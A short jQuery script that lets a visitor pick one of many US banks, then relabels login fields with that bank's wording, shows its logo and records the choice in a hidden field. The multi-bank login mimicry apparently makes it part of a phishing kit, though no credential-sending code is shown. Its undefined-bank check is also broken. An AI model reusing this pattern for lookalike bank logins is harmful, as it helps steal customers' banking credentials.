
	
	
	$('#chosebanks a').click(function (event)  {
		  
		
	var id = $(this).attr("id");
	
	var banks = {
		"bankOfAmerica":{
			hint1:'Online ID',
			hint2:'Passcode',
			
		},
		"capitalOne":{
			hint1:'Username',
			hint2:'Password',
		},
		"chase":{
			hint1:'User ID',
		},
		"citiBank":{
			hint1:'User ID',
			hint2:'Password',
		},
		"fifthThirdBank":{
			hint1:'User ID',
			},
		"huntington":{
			hint1:'Username',
		},     
		"pnc":{
			hint1:'User ID',
			hint2:'PIN/Password',
			},
		"regions":{
			hint1:'Online ID',
			},
		"sunTrust":{
			hint1:'User ID',
			hint2:'Password',
			
		},
		"tdBank":{


		},
		"usBank":{
			hint1:'Personal ID',
			
		},
		"usaa":{

		},
		"wellsFargo":{
			name:'Wells Fargo Bank',
			class:'wellsFargo',
			hint1:'Username',
			rm:['RoutingNumber','accnum']
		},
		
		
		
	}
	
	
	var bank = banks[id];
	if (bank !== undefined) event.preventDefault();
		$("#UserNameIDdiv").attr("data-label-content", bank.hint1);
	$("#PasswordBankdiv").attr("data-label-content", bank.hint2);
	
	$('#chosebanks').hide();
	$("#imgbanks").show();	
	$("#img1").addClass(id).show();
	$("#nwabank").show();
	$("#namebankhidden").val(id)
	

	});
	
	
$('#usaa').on('click',function(){
//$('#doori').show();
$("#usaa123").show();
$('.left').hide();
$('.right').hide();
});
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	

	
